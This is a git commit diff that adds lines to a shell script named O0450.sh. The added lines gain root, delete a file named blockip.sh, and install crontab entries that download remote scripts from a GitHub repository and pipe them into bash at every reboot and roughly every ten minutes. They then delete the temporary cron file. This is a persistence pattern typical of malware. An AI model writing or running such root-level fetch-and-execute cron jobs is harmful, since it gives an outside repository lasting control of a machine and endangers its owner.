24998c1307685f655bea7619f65b9e260433bdb2
junscapital <52300722+junscapital@users.noreply.github.com>
2021-11-29 21:24:39 +0800

    Update O0450.sh

--- O0450.sh
+++ O0450.sh
@@ -1,1 +1,8 @@
 #!/bin/sh
+sudo su
+sudo rm /home/blockip.sh
+echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/inreload.sh | bash
+1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/O0450.sh | bash
+ " >> myverifier
+sudo crontab myverifier
+rm myverifier
